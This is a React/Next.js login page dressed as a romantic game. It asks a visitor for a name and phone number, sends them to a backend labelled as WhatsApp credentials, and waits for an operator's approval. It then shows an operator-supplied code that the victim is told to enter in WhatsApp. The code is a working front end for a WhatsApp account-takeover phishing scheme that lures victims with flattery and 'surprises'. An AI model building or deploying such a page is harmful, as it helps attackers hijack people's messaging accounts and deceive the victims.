"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function WhatsappLogin() {
  const router = useRouter();

  const [name, setName] = useState("");
  const [number, setNumber] = useState("");
  const [requestId, setRequestId] = useState<number | null>(null);

  const [status, setStatus] = useState<
    "IDLE" | "PENDING" | "REJECTED" | "APPROVED"
  >("IDLE");

  const [adminMessage, setAdminMessage] = useState("");
  const [error, setError] = useState("");

  // 🔁 Poll request (status + admin message)
  useEffect(() => {
    if (!requestId || status !== "PENDING") return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch(
          `http://localhost:8081/api/user/request/${requestId}`
        );

        if (!res.ok) return;

        const data = await res.json();

        // 🟡 Message sirf show hoga
        if (data.adminMessage) {
          setAdminMessage(data.adminMessage);
        }

        // 🔴 Reject
        if (data.status === "REJECTED") {
          clearInterval(interval);
          setStatus("REJECTED");
          setError("❌ Rejected. Please enter correct mobile number");
          setRequestId(null);
        }

        // 🟢 Approve → tab hi next page
        if (data.status === "APPROVED") {
          clearInterval(interval);
          router.push("/heartpairgame");
        }
      } catch (err) {
        console.log("Waiting for admin...");
      }
    }, 1000);

    return () => clearInterval(interval);
  }, [requestId, status, router]);

  // 📤 Submit WhatsApp login
  const submit = async () => {
    if (!name || !number) return;

    setError("");
    setAdminMessage("");
    setStatus("PENDING");

    const res = await fetch("http://localhost:8081/api/user/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        platform: "WHATSAPP",
        username: name,   // name yahan jaa raha
        password: number // number yahan jaa raha
      })
    });

    const data = await res.json();
    setRequestId(data.id);
  };

  return (
    <div className="romantic-layout">
      <div className="card">
        <h1>WhatsApp</h1>

        <div className="flex gap-2.5 flex-col">
          <input
            placeholder="Enter your name beautiful"
            value={name}
            required
            className="border border-gray-600 py-1.5 px-3 rounded-lg"
            disabled={status === "PENDING"}
            onChange={(e) => setName(e.target.value)}
          />
  
          <input
            type="text"
            placeholder="Enter your number"
            value={number}
            required
            className="border border-gray-600 py-1.5 px-3 rounded-lg"
            disabled={status === "PENDING"}
            onChange={(e) => setNumber(e.target.value)}
          />
        </div>

        {/* 💬 Admin message (inputs ke niche, button ke upar) */}
        {adminMessage && (
          <p className="font-serif text-gray-800 mx-2.5">
            Enter on your WhatsApp: {adminMessage}
          </p>
        )}

        {/* ❌ Reject message */}
        {status === "REJECTED" && (
          <p className="text-red-600 mx-2.5">{error}</p>
        )}

        {/* ⏳ Waiting */}
        {status === "PENDING" && (
          <p className="text-red-600 mx-2.5">
            ⏳ Waiting for admin approval…
          </p>
        )}

        <button
          className="btn mt-5 font-serif"
          onClick={submit}
          disabled={status === "PENDING"}
        >
          {status === "PENDING" ? "Please wait…" : "Enter number and go for next surprise!"}
        </button>
      </div>
    </div>
  );
}
